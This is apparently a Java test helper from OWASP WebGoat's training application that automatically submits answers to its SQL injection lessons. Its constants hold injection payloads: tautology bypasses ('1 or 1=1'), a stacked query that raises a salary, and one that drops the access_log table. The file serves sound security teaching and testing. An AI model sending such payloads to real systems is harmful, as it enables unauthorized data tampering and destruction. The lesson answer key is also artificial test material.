package org.owasp.webgoat;

import java.util.HashMap;
import java.util.Map;

public class SqlInjection_TestHelper extends TestHelper {

	private static final String sql_2 = "select department from employees where last_name='Franco'";
	private static final String sql_3 = "update employees set department='Sales' where last_name='Barnett'";
	private static final String sql_4_drop = "alter table employees drop column phone";
	private static final String sql_4_add = "alter table employees add column phone varchar(20)";
	private static final String sql_5 = "grant alter table to UnauthorizedUser";
	private static final String sql_9_account = " ' ";
	private static final String sql_9_operator = "or";
	private static final String sql_9_injection = "'1'='1";
	private static final String sql_10_login_count = "2";
	private static final String sql_10_userid = "1 or 1=1";

	private static final String sql_11_a = "Smith' or '1' = '1";
	private static final String sql_11_b = "3SL99A'  or '1'='1";

	private static final String sql_12_a = "Smith";
	private static final String sql_12_b = "3SL99A' ; update employees set salary= '100000' where last_name='Smith";

	private static final String sql_13 = "%update% '; drop table access_log ; --'";
	
	public void runTests(String webgoatURL, String cookie) {
		
		startLesson(cookie, webgoatURL, "SqlInjection");
		
		Map<String, Object> params = new HashMap<>();
		params.clear();
		params.put("query", sql_2);		
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjection/attack2", params, true);
	
		params.clear();
		params.put("query", sql_3);		
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjection/attack3", params, true);
	
		params.clear();
		params.put("query", sql_4_drop);		
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjection/attack4", params, false);
		
		params.clear();
		params.put("query", sql_4_add);		
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjection/attack4", params, true);

		params.clear();
		params.put("query", sql_5);		
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjection/attack5", params, true);

		params.clear();
		params.put("operator", sql_9_operator);
		params.put("account", sql_9_account);
		params.put("injection", sql_9_injection);
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjection/assignment5a", params, true);

		params.clear();
		params.put("login_count", sql_10_login_count);
		params.put("userid", sql_10_userid);
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjection/assignment5b", params, true);

		params.clear();
		params.put("name", sql_11_a);		
		params.put("auth_tan", sql_11_b);		
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjection/attack8", params, true);
	
		params.clear();
		params.put("name", sql_12_a);		
		params.put("auth_tan", sql_12_b);	
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjection/attack9", params, true);
	
		params.clear();
		params.put("action_string", sql_13);		
		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjection/attack10", params, true);
	
		checkResults(cookie, webgoatURL, "/SqlInjection/");
	
	}
}
